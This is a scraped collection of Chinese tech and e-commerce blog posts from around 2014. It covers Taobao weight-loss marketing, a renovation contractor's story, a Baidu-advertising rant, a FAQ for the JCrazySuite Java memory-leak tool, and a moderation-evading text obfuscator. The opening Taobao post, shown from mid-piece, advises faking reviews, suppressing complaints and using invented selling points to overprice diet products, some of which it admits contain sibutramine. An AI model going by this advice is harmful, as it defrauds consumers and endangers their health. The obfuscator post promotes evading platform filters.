小卖家切入减肥市场想以小博大比较难，于是模特内供减肥卖点产品出现了，这个小丸子那个小黑瓶小金瓶，而且这类店有很浓重的店主本人营销色彩，营造模特圈子内人的感觉，这类产品减肥速度确实不错，需记：凡平淡的都养生，凡浓烈的都要命。减肥速度非常快的产品一般含有西布曲明，对身体有副作用。后来淘宝屏蔽了“模特内供”关键词。
2014年，用自己开发的软件分析了高价淘宝减肥市场，趋势很明显，“泰国代购减肥”开始兴起，而且霸占了高价市场，最近又出现了新概念“俄国代购减肥”，在淘宝想要定价权必须要有差异化!这也就是为什么减肥市场一个个差异化包装卖点的出现，说不定后面会出现店主现场直播减肥产品效果...上几张图，懂的人懂得我在说什么，一月几百单利润小10万+的秘密就在图中!
差异化可以产品差异化，可以定位人群差异化，可以主张差异化，同样也可以价格作为差异化!
 
当整个减肥市场，9.9元19.9元29元充斥的时候，那么价格差异化的机会就来了!
一包泡面的价格妄称减肥效果极好，稍微有点理性的买家应该会产生不安全感吧，当你以差异化卖点超高价姿态出现的时候，会直接掠夺高端客户!
现阶段的淘宝减肥市场适合超高价!为什么?
1.淘宝个性化搜索会把优质高端客户推送到超高价宝贝;
2.淘宝市场低价成灾，高价解决安全顾虑问题;
3.对于土豪客户群体，只买贵的不买对的，价格不是他们考虑的最重要因素，效果是最主要因素，还有高价安心也是因素，还有不在低价宝贝里面筛选浪费时间成本也是因素...超高价是土豪们的解药!
4.超高价宝贝对应超高利润，可以保证淘宝内广告和站外广告随便投放，而不需要担忧广告赔钱!
怎么做超高价减肥产品?
1.产品力是第一位，减肥效果要确实不错而且保证安全，可以成本很高;
2.产品必须有差异化卖点包装，简单的说就是给超高价一个理由，我凭什么买你这么贵的宝贝?(模特内供牌?中药世家牌?泰国代购牌?明星信任牌?俄国代购牌?绝对安全无副作用牌?你打什么牌...)
3.流量注入组合拳，站内站外流量结合，有淘宝客资源有外网流量资源会很容易切入!
一单利润300，一月出700单，毛利润21万，简单的帐大家算吧，暴利永远存在各种行业，看你是否够狠!借用王通的话，你敢卖我就敢买!这是真理...
绿瘦最近貌似被打击了，对于绿瘦这种大手笔运作，前端的几百的减肥产品只是开胃菜，最重要的是后端，每个客户的后端跟进消费，后端价值很高。
精油类减肥产品可以非常细分，瘦腿，瘦脸，瘦大腿....产品都是一样的，成本都是极低的，只要你刮痧了必然就有用的，市场是永远存在不变的，切入是相对容易的...
说 说减肥市场流量的变化，在百度大规模围剿淘宝客站之前，淘宝上的减肥产品流量来源的60%依赖淘宝客，站外流量为主，谁掌握了站外淘宝客资源谁就是减肥大 爆款，淘宝客是阿里玩的一个高端太极，绝对的乾坤大挪移，这个以后找个时间说。“减肥产品排行榜”之类的关键词完全是淘客站群炒火的。百度k淘宝客站之 后，60%以上的流量为淘宝搜索流量，转为站内流量为主，淘宝客流量其次。
草根切入淘宝减肥市场的玩法：
1.超低价走量，代表为19.9包邮之类的，超高转化率，量走大后利润才能出来
2.正常价格，先期低价走量后慢慢提价
3.差异化卖点+超高价玩法，不走量，利润也很好。
以上玩法都必须先期有大量流量注入，这篇讲玩法先不讲流量，新品快速破0和极速累积原始销量这块我会先一个专门的电子书最近几天发布，大家可以注意我qq空间通知...
如果你仅仅以为你懂了以上玩法就可以玩转淘宝减肥市场的话，那就有些天真了。启动资金可大可小，货源1688去找，流量资源是关键因素，同样还有2个关键因素：刷评价+处理中差评!你真的以为那些信誓旦旦的好评都是客户的吗?没有评价布局你就不要玩了，没有售后处理团队你也别玩了，这些产品的纠纷率和差评率很高，你没有牛逼的处理中差评团队基本可以歇菜了，大C玩减肥的疯狂时代中差评处理是给外包团队的...
对于减肥的MM，减肥药的减肥速度和副作用成正比，减肥非常快的一般是脱水，出来混迟早要还的，哪有那么好的事!对于减肥，用张柏芝说的一句话：管住自己的嘴。开源节流，尤其晚上不要摄入太多，配合适量运动就ok。如果非常吃东西的话，建议吃魔芋+营养素+真正的左旋肉碱， 魔芋吸水膨胀80到100倍产生饱腹感抑制食欲，没有副作用，一些维生素微量元素什么的用来补充摄食少而缺少的，靠谱的左旋肉碱一般去买正规运动营养品 牌，这样搭配起来比较安全，这是我看到一个朋友的案例后对减肥的理解。题外话：谁把这个组合搞到淘宝?反正我不做减肥，这也是差异化!
在淘宝玩法太多，机会也太多，没有对错，存在即合理，总有一些类目存在那里给草根逆袭的机会，就看个人的执行力了!赚钱的还在赚钱，不赚钱的过了一年还不赚钱，请问下自己：你够狠吗?
逐鹿出品!必属精品!求赞求转发求支持!
(逐鹿个人微信号:zhulutaobao,干货分享朋友圈!逐鹿微信公众账号：zhuluflytaobao)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
江水平：我是如何通过互联网做装修生意的, lusongsong.iteye.com.blog.2025236, Tue, 04 Mar 2014 10:01:40 +0800

导读：“我9年前做装修开始就直接使用互联网接业务，到现在一直靠网络接单，生意可以说风生水起，去年我的营业额在千万级别。”这就是江水平的故事，那么他是如何一步步做起来的?请看本文。
和“江水平”是在微信上认识的， 是一只装修队的名称，就是给家庭做装修工程的，和传统企业主不同，他所有业务均来自互联网，营销思维超前，注重口碑营销，从不投入硬生生的广告，这让我感到很惊讶。
之 前我也没想过搞装修的竟然能和互联网联系起来，前年我家装修的时候压根没想过通过网上找，也是找朋友介绍，而“江水平”竟然一直通过互联网接生意，一做就 是9年，去年营业额达到千万级别。到底是什么样的模式，让我感到好奇。这就是要介绍下他的主要原因，跟大家分享下他的故事，看看他是如何通过互联网一步步 做起来的。部分内容取自江水平的QQ空间。
江水平和小雨
江水平出身于北京东边一个山城小县，因为没文凭没手艺，所做的活都是苦力，曾经做工装卸工：在雨天气里装火车，走上去扛着100斤一袋的化肥在上边来回走，而且还要走一天一夜，吃饭都不能离开现场;
曾经装卸过水泥车，十五吨的大汽车四个人装，抱着一百斤的水泥袋来回跑，满手满脸的水泥，等装完车手腕子和肚皮上血殷殷的，吃饭睡觉都在车上;
去乡下私人小厂做板材，被人拿着皮带逼着干活，苦点累点没关系，有时候却拿不到工资，过年都没办法回家，年三十晚上只好一个人在北京一家地下室吃方便面，初二就去工头家要账，被人打到头破血流惊动公安局。
做 农民工的时候业余生活单调乏味，在宿舍门前有一个很大的网吧，每天看着人家进进出出的很是羡慕，有一天我终于鼓足勇气花十元钱买了一个通宵，在反反复复的 《龙卷风》《绿光》《一笑而过》歌声中呆子一样看着屏幕上的文字一串串流过，花花绿绿的，简直心花怒放，有时候开始尝试和人搭讪，发十个消息偶尔会有一个 回的，因为打字实在太慢，没人愿意跟我聊。身边一起上网的男女看我笨拙，偶尔也会点播我一下，让我知道了网上也可以看毛片，也可以去榕树下看小说，也去九 城渔人码头钓鱼，太多太多的内容，简直又到了另外一个新的世界。
从此以后我辞掉了工作，每天泡在网吧里，饿了叫外卖，困了就趴在机器上睡一 会儿，有时候连续三天三夜在网吧里泡着。上网多了，对网上的东西就熟悉了，打字也快了，先是跟女子们逗逗贫，然后就去九城玩玩社区游戏，再后来就帮朋友管 理一个文学版块，因为是新开的版，需要版主到处去拉人，我就跑到九城发文学论坛邀约人的广告，就这样，一则小广告带来了一个女孩加我QQ。这个女孩就是小 雨，我现在的老婆。
她那时喜欢写小文章，她把写过的小品文发给我看，记得是描写秋天黄叶的，很有味，我由衷的赞赏，也提了一些意见给她，我 把她的文章放在文学版块最上边，还带着她认识我以前的网友，到处逛，很开心。那时站里有虚拟结婚的游戏，我和小雨就是那里几对夫妻中的一对，也说一些腻腻 歪歪亲亲近近的话，可是我太清楚我的条件了，我太明白什么叫自知之明了，所以当小雨告诉我她要从2000里之外的南京来找我的时候我就有点犯晕。
我跟老板支了500块钱，买点旧报纸糊了一下我租的那间不到8平米的小房，花了15元买了一身新衣服，和同事借了个随身听，晚上就去北京站过夜，等待第二天八点带着小雨来的那趟著名的T65列车。
后 来，我带着我的爱情和希望来到了租住的小屋。这是一个大杂院，集体盖的石棉瓦的简易棚子，租客一家挨着一家的，每家的门口都放着烧蜂窝煤的炉子，有的炉子 上煮着肥肠，香味飘出老远;我们来到出租房，有点担心小雨埋怨条件差，可她并没嫌弃的表情，四处看看，说了一句"挺干净的。"
就着这样从恋爱到结婚，我们的日子过的清贫但快乐着。那时候我在西直门找了个工作，小雨找的工作也在那附近。
(带小雨去长城玩时候顺便照的)
走，去南京发展
小雨给了我也许是这一生中最正确的建议，到南京去发展。离开已经混了十年的北京去到一个陌生的城市，对谁都是个考验，但是我也明白，如果还在北京混下去，再来十年都不一定能出头，北京的路太硬，踩不出足迹，所谓人挪活树挪死，豁出去了，闯一下吧。
我们的落脚点是在中央北路张王庙的一处违建，石棉瓦的棚子，比北京的还小，放了一张床走路就要侧着了，连把椅子都放不下。最闹心的是竟然还有老鼠住在顶棚上。
也正是因为小雨，让我第一次有了要努力赚钱，让跟着我的女人扬眉吐气，摆脱贫穷的念头。
在互联网上接活
我的斗志就是在这样的状态下被全部激发出来了，当时我没有再找工作，准备在互联网上创业，就从我熟悉的装修开始。
当时我是没任何创业计划的，只是一个念头，干吧，不干就完蛋了。
自 己干，最起码要先有个名号，这点是我擅长的，因为我从小喜欢文学，尤其喜欢古典诗词，随意的就想起了刘禹锡的一首诗“杨柳青青江水平，闻郎江上唱歌声;东 边日出西边雨，道是无情却有情。”我取中间三字，江水平，因为没能力注册公司，就取名江水平装修队。这就是我名号的由来。
网上创业，没电 脑，就去网吧写小广告，拼命的到各个论坛去发，那时候的华侨路茶坊业主社区管理的还不严，我把几百个社区每一篇的帖子后全发上了我的广告，那是个非常枯燥 的工作，复制黏贴，复制黏贴，有时候偶尔想想，这样起作用吗，心里泛起一阵恐慌，立刻刹车，不敢想了，继续埋头苦干;
有时候发的实在不像样子，各个版的版主就开始封号，他们封一个我注册一个，封我IP我就换网吧，我估计到现在城北也有很多网吧是上不去华侨路茶坊的，就是那时候我闯下的祸;有的版主实在无奈了，就发短消息给我说。
兄弟，为了混碗饭吃你发广告我理解，可你能不能换点花样啊，老发那一段话你不疯我也得疯啊。
小 广告发的是铺天盖地，可是手机却一个礼拜也不响一声。傍晚居委会大妈来敲门，要我们交75元半年的垃圾清运费，把钱交出去那一刻就像把心剜出来了的样子， 心疼的要命，我从来就不是个很会算计花钱的人，可那时候手里只有四千元的前公司的遣散费，再没其他进项了，工作也没了，计划着的所谓的创业却是个一毛钱都 没投入项目，虽然是在拼命的干着，说实话，心里真没底，偶尔想到万一三月两月不开单，那我们一家三口在南京这样的大城市怎么生活啊。
网上接到了第一个活
忐忑中挨过了十三天的时光，那一天的上午十点多，手机忽然唱起了歌谣，号码是陌生的，我拿起电话按下了接听键，手和声音都是颤抖的：”
“喂，是江水平装修队吗?
“是的”
“我有一套房子，最近想装修，你们能不能派人来看一下”.
没 想到还是个大伙，业主是位三十左右岁的帅哥，国字脸，连带笑意，感觉很随和。一家人是搞房地产的，家里很多套房子，这套是给他结婚用的，为了让他自己得到 锻炼，父亲给了他五十万，让他自己负责这次装修的全部。吴先生家庭条件优越，从没独自担纲过大事，初次接受任务，一心一意要出色的完成任务，让父母高看一 眼。
可是装修不是容易的，他跑遍了大大小小的公司，取得过很多方案，费尽九牛二虎之力鼓捣了俩月也没弄出个眉目。前两天家人问追问的紧，在没办法的情况下去论坛逛，才发现了我的小广告，鬼使神差的就相信了我。
没想到，江水平接到的第一个活竟然如此之大。
第一份报价系统
在 给这位帅哥客户测量完之后，我直接去了网吧，用小U盘把原来公司的报价表考到网吧的机器上，就按照那公司的单价适当的减掉一些，算作我江水平装修队的报价 系统。用了一晚上的时间，打了无数的咨询电话，在朋友们的指导下把这份报价凑成了;这是江水平装修队第一份报价表啊，有着划时代的意义啊。我用邮件把报价 发到他的信箱，剩下的就是忐忑不安的等。
没过几天吴先生就紧锣密鼓的联系我见面看我工地商讨报价然后签约交定金。事情顺利的让我有点不敢相信这是真的。
后 来过了很长时间我问吴先生为什么当初选择我，吴先生说不是因为便宜才找你，是因为付款方式，你的付款方式能让我有控制权，做不好不给钱呗，我跑了十几家装 修公司，都是很有派头很有实力的，但他们都要求先预付百分之六十，那么多钱交给他们了，也就等于把装修的控制权交给他们了。
从那以后我一直 呵护这种付款方式，从不允许有丝毫的改变。我的这种呵护也为我带来了丰厚的回报，这个付款方式不知道为我筛选了多少聪明的有学问的业主，很多业主都是大学 生或者各大学校的教授或者博士，都是那些把装修文章看遍了的人，反而是那些不怎么懂装修的市民不愿意找我们，我想这就是付款方式起到的筛选作用吧。
凭 着我的真诚，凭着一点文笔，我在网上接活的套路渐渐熟悉，招法也多起来，从各个渠道找来的人络绎不绝，但是却有一个困扰着我的瓶颈始终不能突破，那就是及 其缺乏手艺精湛，认真负责的手艺人。我相信这也是困扰所有装饰企业的一个问题，解决的好就会活的很滋润，解决不好就会在泥潭里挣扎。
发展
初期创业我手里只有四千块钱，但一分钱不敢花，因为孩子还小，还在城市租房子住，所以属于无本创业，甚至连电脑都没有，只好去网吧发纯广告，这种办法也能上来一些客户，但质量不高。
接着我自己开始写软文，第一篇叫一个包工头的装修日记，描写装修黑幕的，描写我对黑幕深恶痛觉的态度，发出去后很火，带来生意了，再以后我引导客户在论坛写装修日记，一点一点描写我们施工队的服务过程，这两个办法让我们客户质量进一步提高。
客人相信我们还有几个因素：
首 先我尽量不无原则地夸自己产品好，而是以一种知识性的文字来教客户怎样识别好坏，当别的公司还在拼命鼓吹自己多好时候我却教业主如何省钱，教业主不要做过 多花样，不要把钱浪费在无意义的装饰上边，我的标语是“再好的装饰时间长了也如弃妇，看都不愿意多看一眼，反倒是那些方便的生活设施，能给你未来的生活带 来幸福”，现在人多聪明啊，从你的宣传语上就可以看出你的真面目;
我肯替别人着想，客户认可了我这个人，我的产品自然就认可了;因为师从江 礼坤，还学会了讲企业故事，我把和老婆的从恋爱到结婚到创业的艰苦历程用图文形式展现出来，得到了太多业主的认同，因为我的客户女同志居多，她们很感性， 从我的故事就能判断我的为人，有的客户别的什么都不看，就凭这个故事直接找我做。
然后我就在专业装修论坛版块装专家，为什么说装专家，因为真不懂，但客户问我问题后我会打电话问懂行的朋友，一来二去就真的成了行家，因为我为人诚挚，得到了很多人认可，客户渐渐上来了。
另 外我的客户很多都是老客户介绍的，介绍的时候已经把各种情况说明了，然后一切顺理成章;那些不是老客户介绍的为什么也相信我们呢，因为大部分人都是在我的 论坛潜水很长时间的，有的竟然潜水三年多，这样的客户对我们的一举一动非常熟悉，对我们的流程也是了如指掌，那么签约在哪里又有什么奇怪的呢。
直到现在，我的工作人员只有两名，一个是专门看QQ接待网上客户的，一个就是我自己，晚上要管理论坛，看晚上的QQ接待客户;白天偶尔跑跑工地，虽然管理人员很少，但是队伍一直在正常运转，越做越好。
(现在的江水平)
写在最后：
所谓的成功，不仅仅是获得了多少金钱，还在于看准了目标，为之而努力的过程之中，这就是“江水平装修队”的故事。
ps：由于主人翁的建议，恋爱、结婚过程略去，有兴趣的可加江水平的QQ空间吧www.jspzxd888.com。在征得本人同意后，特此发上他的微信号，感兴趣的朋友可以多跟他取取经!微信号是“江水平装修队”的拼音首字母：jspzxd （文章来源：卢松松博客）
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
我做我的百度竞价：我赚多少钱，与你无关, lusongsong.iteye.com.blog.2024670, Sun, 02 Mar 2014 20:07:17 +0800

　　此篇文章仅为了泄愤伸手党，最近一直在看松哥的博客在写关于伸手党这个事情，国内免费午餐的时代早就随着改革开放随风而去，你是风，你是沙!
　　大多数人，向别人问一个问题，问两个问题，问三个问题，问到成了你的免费顾问，然后自己屁颠的赚钱，有难题再来问，知不知道在火车站换个硬币给手机充电，如果你不买东西是没人给你零钱的，更何况你我都是陌生人!
　　
　　今年是笔者在百度竞价领域的第七个年头，这么多年不管最早在医疗行业从事竞价，到后面为传统企业提供百度竞价托管服务，以及操作竞价暴利产品跨入百万。
　　这些年粗略的计算一下，平均每天有三个人问我问题，3*365*7=7665个问题，每个问题平均五分钟，遇到难缠的打电话都能打两小 时，7665*5/60/=638.75小时 也就是不吃不喝不停的被不同的人问不同的问题，26个连续的日日夜夜，这么多年，真的不想再说了，都是泪，太多的事情，被这群伸手党打的支离破碎，虽然中 途有收到近百人付过有10几万的学费，但是这些钱都不够买台好电脑的啊，后来我把这群伸手党，全部赶到了我弄的一个论坛，竞价007论坛!
　　2012，2013，以及2014年这两三年的竞价竞争大了，对账户的操作以及关键词数据分析更加严格，对网盟的受众挑选更加严谨，同时百度竞 价的竞争已经逐步的升级到综合能力的抗衡，其中包括如何渗透竞争对手，防止360拦截，以及DDOS网站防护，你不必完全掌握这些，但是如果你不懂这些， 你肯定活不下去。
　　其实可能很多人都会误认为百度竞价不赚钱了，其实不然，反而这两年有能力的人有水平的人赚钱更多了，反而那些根本不会操作竞价的人，不懂竞价闭环的人，陪的稀里糊涂;
　　身边有个朋友，08年，09年玩竞价的时候，按理说应该会很好做，其实一年忙到头也就捞个二三十万，因为那个时候中国还没真的进入网络购物时代，真正的崛起应该是2011年的淘宝双11频繁登陆各大媒体央视，从那一段时间后，我们的营业额基本都提升了3-5倍。
　　反而08、09年却出现了一大批的以竞价培训为口号的骗子，这群骗子从那以后他们是有钱了，教学员一些百度客服教的基础操作，让这些学员们进入 了一塌糊涂的竞价生涯，师傅领错门，修仙了无然，至于到底是谁，我们业内心知肚明即可;(由于涉及到个人隐私甚至人身攻击，本段被略去)。
　　最后，泄愤结束，为表我感谢大家阅读此篇，丢出了正在盈利和赚钱的七个产品闭环运作方式，如果你能找到我，这些将恭送出去。
　　感谢007论坛的投稿
　　​
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JCrazySuite--检测内存泄露的神器，持续构建的加速器。, garfield-geng.iteye.com.blog.2017199, Fri, 14 Feb 2014 02:52:46 +0800
00）最重要的功能是啥？ 1 Memory-Leak Detector。重复跑千万次TestCases，检查：内存泄露点/死锁点/源码质量/测试源码质量。2 Auto-Test Accelerator。分组并行跑TestCases，充分发挥多核CPU威力，加快几倍几十倍build速度。两者都需要：全覆盖率的TestCases。 02）最典型的样例和用法是啥？ 新建AllTest0.java，把光标移动到此method范围里，Eclipse/ NetBeans/ Intellij IDEA的右键菜单Test File/ Run Focused Test/ Run As JUnit Test都能带动的。
public class AllTest0 {
  public static Test suite() {
    int rounds = 3, bigRounds = 1300, sleepTimePerBigRound = 24/* seconds */;
    CrazySuite suite0 = new CrazySuiteForJUnit(MyClass.class, true, rounds, "Test");
    CrazySuite suite1 = new CrazySuiteForTestng(MyClass.class, true, rounds, "Test3");
    CrazySuite suite2 = new CompositeCrazySuite(suite0, suite1);
    //
    CrazySuite suite6 = new CrazySuiteForJUnit(Xxx.class, true, rounds, "Test");
    //
    CrazySuite multiThreadCrazySuite =
          new CompositeCrazySuiteWithMultiThreads(suite2, suite6);
    //
    CrazySuite allCrazySuite = new CrazySuiteForBigRounds(
            new CrazySuiteParams(bigRounds, sleepTimePerBigRound),
            multiThreadCrazySuite,
            new CrazySuiteListener.DefaultHeapListener());
    return allCrazySuite.build();
  }
}
 05）有人说：测试组有压力测试的，可以搞定内存泄露。让他们去搞。有人说：这个在嵌入式方面可能好些，做服务器开发，内存条那么便宜。有人说：每隔几天restart就行了，不用搞TestCase，更不用搞JCrazySuite。 他们的说法很适合于：低质量的项目或中国式的混事型的项目。请关闭这张网页。 06）某工程有5000行，TestCases总共只有70行，用JCrazySuite能做什么？ 无法有效的使用JCrazySuite。如果你是个真正的重视质量的程序员，那么针对这工程的各种TestCase应该有10000+行才对。经过了Code Coverage Tools的多次检查后，还会增加，应该有30000+行才对。10）如何用JCrazySuite精确检查内存泄露点？ 如果有全覆盖率的TestCases，源码的每行都会被执行到。内存泄露点，肯定是在某几行上。按照Code/Branch Coverage最小的来计算，普遍是：1。如果把全覆盖率的TestCases重复跑千万次，那么内存泄露的空间就会放大千万倍。那么在jconsole/jvisualvm/jmc/jprofiler绘制的图形上，就容易观察到：波形的低点总在逐渐升高。这时得到结论：肯定有内存泄露。如何找到那几行呢？JCrazySuite用两种排除法帮你找内存泄露：排除法（A），重复的单独的跑某个package及其child package，例如：跑基于Xxx.class所在的packagenew CrazySuiteForJUnit(Xxx.class, isRandom, 300, JUnit, "Test"); 如果结论是这个package的TestCases有内存泄露，就把TestCases分成2堆（二分法），分别跑每堆。new CrazySuiteForJUnit(Xxx.class, isRandom, 300, JUnit, "AbcTest", "XxxTest"); 排除法（B），针对整个工程的测试源码，每次跑符合某规则的：A*Test, B*Test// 会生成符合英文字母顺序的{"A*Test", "B*Test", ……"G*Test"}
String[] suffixPattern = buildTestClassNameFromAtoG("Test");
new CrazySuiteForJUnit("myclassesdir" …… 300, JUnit, suffixPattern);
跑完了，结果正常，就跑下面的2轮：buildTestClassNameFromHtoN("Test")
buildTestClassNameFromOtoZ("Test") 如果找到了，再逐渐缩小范围：new CrazySuiteForJUnit("myclassesdir" …… 300, JUnit, "O*Test", "P*Test"); 符合{"O*Test", "P*Test"}的class正规名字，每次都会打印出来，也能帮助你快速缩小范围。new CrazySuiteForJUnit("myclassesdir" …… 300, JUnit, "Obj*Test"); 得到结论：ObjectXxxTest跑过的行，泄露了内存。最后，ignore掉ObjectXxxTest的某些test method，再继续重复跑。再最后，找出了某个test method，再跑，用VisualVM查看。在内存泄露较多的时候，在DefaultHeapListener提醒后，dump几次，结合此TestCase走过的源码路径，对比dump data，找最主要的Type，随机查看几十项，就能发现毛病根源了。12）JCrazySuite基本理论是啥？还有些啥好处？ 1 基于TestFramewok、Code Coverage Tool，用排除法检测工程里全部的memory leak。2 要跑JCrazySuite，先要有足够的TestCase，这就促进了你写TestCase，而此过程又促进了Refactory。4 促进了“持续集成+性能测试”。把JUnit、TestNG等等的多种多个TestCase集中在一个TestSuite里跑。在同一个JVM内，用单线程或多线程，跑多个TestCase，定时GC，定时assert JVM message，All-In-A-JVM。再配上JDK自带的jconsole/jvisualvm/jmc，实现了完美。你可以扔掉其它性能测试工具了。6 从跑的行为（动态的，而非静态的评审源码的行为）上检验源码和测试源码质量如何。跑的过程，将会出很多毛病，促进你优化code。实际上，我已经用它从"跑"的行为上，检验出Ant-1.9.3、JUnit-4.10、Spring-3.1.2等多个毛病了。7 JCrazySuite的监听器有多种，还提供接口实现自定义的功能。例如：从跑的过程中记录超过N秒的TestCase，促使你精简code。15）检测内存泄露，具体用哪些class？ 用CrazySuiteForBigRounds，它是不收集测试结果的，避免了和真正的内存泄露搞混淆。注意：只能用这个，不能用别的。因为别的（CrazySuiteForJUnit/ CrazySuiteForTestng/ CompositeCrazySuite）在跑的过程中，既收集测试结果，也有listener收集信息，这会消耗小部分内存，会和工程本身的内存泄露点混在一起，导致无法分辨。20）如果不用或者忘记打开了jconsole/jvisualvm/jmc，如何检查内存泄露？内存泄露检测有啥算法？ 0.3.0版本后，完全没有算法了。new CrazySuiteListener.DefaultHeapListener(); 看 48）24）某工程有4000行，某行泄露内存，一次执行只泄露一个byte，怎么办？ JCrazySuite主要就是重复千万次的跑TestCase，放大所有的内存泄露点，参数里有iterations、bigRounds。把虫虫变成大象，就容易找到了。 27）JCrazySuite和啥软件重复了？ 通过baidu、google、sourceforge、google code可以得到结论：JCrazySuite没有重复。这符合软件原则：Don't re-invent the wheel.30）JCrazySuite和Ant、Maven结合，有自己的插件吗？ JCrazySuite创建的的都是junit3的TestSuite，Ant、Maven都认识的。兼容全部BuildTool（Ant、Maven……）兼容全部Java IDE（Eclipse、NetBeans、Intellij IDEA、JDeveloper……），兼容全部Java TestFramework（JUnit、Testng……）。45）关于JCrazySuite的搭配，推荐啥TestFramework？推荐啥Coverage Tool？ JUnit，简单易用，最好了。Testng，本身过度复杂，在各大IDE上的版本都不同，本身也有内存泄露，新版本久不更新，不推荐。Cobertura编译级别适用于java5，不适用于java7。目前有个开源的JaCoco支持Java7编译级别，但版本低，待改善。47）有啥著名的内存泄露的例子？ Testng，MethodHelper，有3个static Map，会导致严重的内存泄露。既然如此，为什么JCrazySuite还能基于Testng跑呢？因为JCrazySuite针对MethodHelper有特别处理：在每个new TestNG().run()后，用reflection makeAccessible执行了map.clear()。48）如果不用JCrazySuite的排除法，只用VisualVM的多次dump，还不要总盯着看，还要为了避免dump多余的数据而把时间点掐得很准很准，如何快速查找内存泄露点？就算能熟练操作VisualVM，dump出来的东东太多，难以从大量数据中分辨内存泄露点，怎么办？ 跑300组，每次同时跑CompositeCrazySuiteWithMultiThreads一组内的多条线程（能快速暴露毛病），等一组跑完，强行gc，再sleep(40秒)，这就是个纯净的时间段了，没有任何CPU和内存消耗。这是最最精确的可dump的时间点了，dump出来的东东是最最小的。很爽！！！这时JCrazySuite用默认的3种方式提醒你在VisualVM里搞dump：（1）默认的提示：控制台，字幕提示（2）从视觉上提示：弹出个几行字的网页，提示你搞dump（3）从听觉上提示：连续搞40秒toolkit.beep() 这样搞几组后，用VisualVM对比几个dump的东东，就能在最小的差距范围里看出些毛病了。通常的内存泄露点是：static Map & Collection、file.deleteOnExit()，zombie thread，non-closed stream，ThreadLocal还会附带的消耗些String、char[]、Object类型的内存。49）CrazySuiteForBigRounds弹出来的网页是啥样？ CrazySuiteForBigRounds不会弹出网页，而是DefaultHeapListener弹出的网页，可以自定义的。这是跑JCrazySuite自身的例子，每次bigRound跑完，gc 3次，就会新增一行数值并弹出网页，提示dump。Dump jvm heap quickly with VisualVM. 2014-03-12T07:33:11 Used Memory= 12 MBDump jvm heap quickly with VisualVM. 2014-03-12T07:40:51 Used Memory= 9 MBDump jvm heap quickly with VisualVM. 2014-03-12T07:48:30 Used Memory= 9 MBDump jvm heap quickly with VisualVM. 2014-03-12T07:55:43 Used Memory= 9 MBDump jvm heap quickly with VisualVM. 2014-03-12T08:03:02 Used Memory= 8 MBDump jvm heap quickly with VisualVM. 2014-03-12T08:10:27 Used Memory= 8 MBDump jvm heap quickly with VisualVM. 2014-03-12T08:17:34 Used Memory= 8 MB53）在用JCrazySuite内存泄露模式跑之前，需要做什么？ 先把整套TestCases全部跑2轮，串行的方式，非并行的方式，确保它们全部正确。54）用JCrazySuite的多线程模式跑全部TestCase，开启全部的jconsole/jvisualvm/jmc，JVM总crash，为什么？ JVM无法承受，CPU太忙了。建议：开一个jconsole就行了，重点关注PS Old Gen项。如果它长久的持续升高，就是泄露内存了。58）JCrazySuite和大家的app、junit/testng的层级关系如何？ YourCrazySuite---->JCrazySuite---->Your JUnit/TestNG Test class60）5个子工程，共有30,000个TestCases。用JCrazySuite能做啥？ 对于超大型的工程，JCrazySuite更加有效果。把5个子工程按照package和4核/6核/8核CPU情况拆为大约20份，确认这20份的运行没有互相影响，每份都做个CrazySuite，都放在CompositeCrazySuiteWithMultiThreads(suite01,suite02, ....suite20)里，suite01/suite02/…都将作为单独的线程启动，同时跑TestCases，加速了几倍几十倍，这会节省程序员大量时间。65）将来有了别的测试框架，能兼容吗？ JCrazySuite站在时代的高点上，兼容了Testng，并提供接口实现用别的测试框架跑TestCases。70）JCrazySuite的i18n功能是啥？ 把测试数据（Pojo/Array/Collection）以json的形式来生成/读取，都放在编程语言通用的.properties文件里。例如：testPutIn^putIn(org.sourceforge.jcrazysuite.i18n.helloworld.Fruit[]^java.util.List<org.sourceforge.jcrazysuite.i18n.helloworld.Cracker>)^ReturnObj=\
{\
        "name" : "",\
        "fruitArr" : null,\
        "crackerList" : [\
                {\
                        "id" : 0,\
                        "weight" : 0.0,\
                        "producerUrl" : "http://java.sun.com/FAQ.html"\
                },\
                {\
                        "id" : 0,\
                        "weight" : 0.0,\
                        "producerUrl" : "http://java.sun.com/FAQ.html"\
                },\
                {\
                        "id" : 0,\
                        "weight" : 0.0,\
                        "producerUrl" : "http://java.sun.com/FAQ.html"\
                }\
        ]\
} CrazySuiteI18N特别适合于：Java工程转成C++/C#/PHP/Python等工程，确保套件的测试数据的一致性。72）为啥叫做CrazySuite？ Suite，本身就是多个TestCase。Crazy，意味着：不是跑1次，而是跑千百次。几个class，都有iterations参数。junit3有TestSuite，CrazySuite就是TestSuite的加强版。75）作者是谁？源码有多少？源码在哪里？ 我。 src core在24KB内，做得足够简单，是那种“很容易找出是否有毛病的东东”。http://sourceforge.net/p/jcrazysuite/ 80）某工程有600个class，800个TestCases，需要自定义几个CrazySuite来带动？ 一个就够了。就像本文开头的code片段一样，只有几行。因为这种风格足够足够简单，以至于不需要别的风格了。例如：junit4的@风格，就是多余的。85）口号？ 跑，跑，跑，疯狂的跑！把毛病都跑没了，让测试组郁闷去吧。 99）欢迎批评
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
【创】和谐文字混淆器, garfield-geng.iteye.com.blog.1040781, Thu, 12 May 2011 03:46:58 +0800
鉴于网民们在网上发言总是被和谐的事实，本人用Java Swing程序做了一套 《和谐文字混淆器》 ——能绕过各大网站程序刁难民众发言的桌面软件，免费提供给广大百姓使用。欢迎大家提出宝贵意见给我。 · 在此文的评论上留言。 · 或者，发邮件给：1970426000@qq.com  如果阁下有空，请给评论，两句都行的。有人转载，功德无量。  
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
再解Java中的String, tomcat-oracle.iteye.com.blog.2063891, Thu, 08 May 2014 13:53:57 +0800

　在Java中，有一组名词经常一起出现，它们就是“对象和对象引用”，很多朋友在初学Java的时候可能经常会混淆这2个概念，觉得它们是一回事，事实上则不然。今天我们就来一起了解一下对象和对象引用之间的区别和联系。
　　1.何谓对象？
